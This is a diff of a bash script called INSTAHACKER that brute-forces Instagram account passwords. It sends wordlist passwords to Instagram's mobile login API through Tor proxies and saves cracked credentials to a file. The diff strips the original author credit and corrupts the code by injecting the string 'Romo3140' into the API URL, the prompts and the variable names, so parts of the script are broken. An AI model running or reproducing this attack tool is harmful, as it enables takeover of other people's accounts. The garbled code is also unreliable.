@@ -1,7 +1,8 @@
 #!/bin/bash
 # INSTAHACKER
-# www.github.com/originalabhay
-# WITH POWER COMES GREAT RESPONSIBILITY
+# www.github.c
+
+# 
 
 trap 'store; exit 1;' 2
 
@@ -24,7 +25,7 @@ device="android-$string16"
 uuid=$(openssl rand -hex 32 | cut -c 1-32)
 phone="$string8-$string4-$string4-$string4-$string12"
 guid="$string8-$string4-$string4-$string4-$string12"
-var0=$(curl --socks5 localhost:9051 -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)
+var0=$(curl --socks5 localhost:9051 -i -s -H "$header" https://i.instagram.com/romo3140 /v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)
 var2=$(echo $var0 | grep -o 'csrftoken=.*' | cut -d ';' -f1 | cut -d '=' -f2)
 
 
@@ -38,10 +39,10 @@ printf "\n"
 
 
 function start() {
-read -p $'\e[1;92mUSERNAME: \e[0m' user
-checkaccount=$(curl -L -s https://www.instagram.com/$user/ | grep -c "the page may have been removed")
+read -p $'\e[Romo3140 : \e[0m' user
+checkaccount=$(curl -L -s https://www.instagram.com/$Romo3140 / | grep -c "the page may have been removed")
 if [[ "$checkaccount" == 1 ]]; then
-printf "\e[1;91mInvalid Username! Try again\e[0m\n"
+printf "\e[|{Romo3140 ! Try again\e[0m\n"
 sleep 1
 start
 else
@@ -275,7 +276,7 @@ while [ $counter4 -lt $turn ]; do
 
 IFS=$'\n'
 for pass in $(sed -n ''$((startline+sumstart))','$endline'p' $wl_pass); do
-header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
+header='Connection: open", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
 data='{"phone_id":"'$phone'", "_csrftoken":"'$var2'", "username":"'$user'", "guid":"'$guid'", "device_id":"'$device'", "password":"'$pass'", "login_attempt_count":"0"}'
 ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
@@ -288,7 +289,7 @@ useragent='User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xia
 let counter4++
 printf "\e[1;77mAttempting passwords from bloop.lst (%s/%s)\e[0m: \"%s\"\n" $countpass $count_pass $pass
 
-{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9054 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.haxtagram ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.haxtagram \n\e[0m"; rm -rf nottested.lst; kill -1 $$ > /dev/null 2>&1 ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.haxtagram ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.haxtagram \n\e[0m"; rm -rf nottested.lst; kill -1 $$  > /dev/null 2>&1 ; elif [[ $var == "Please wait" ]]; then  echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; pid4=$! ; # wait $!;
+{(trap '' SIGINT && var=$(curl --socks5-hostname 127.0.0.1:9054 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Romo3140 : %s, Password: %s\n" $user $pass >> found.haxtagram ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.haxtagram \n\e[0m"; rm -rf nottested.lst; kill -1 $$ > /dev/null 2>&1 ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.haxtagram ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.haxtagram \n\e[0m"; rm -rf nottested.lst; kill -1 $$  > /dev/null 2>&1 ; elif [[ $var == "Please wait" ]]; then  echo $pass >> nottested.lst ; elif [[ $var == "" ]]; then echo $pass >> nottested.lst ; fi; ) } & done; pid4=$! ; # wait $!;
 
 let startline+=20
 let endline+=20
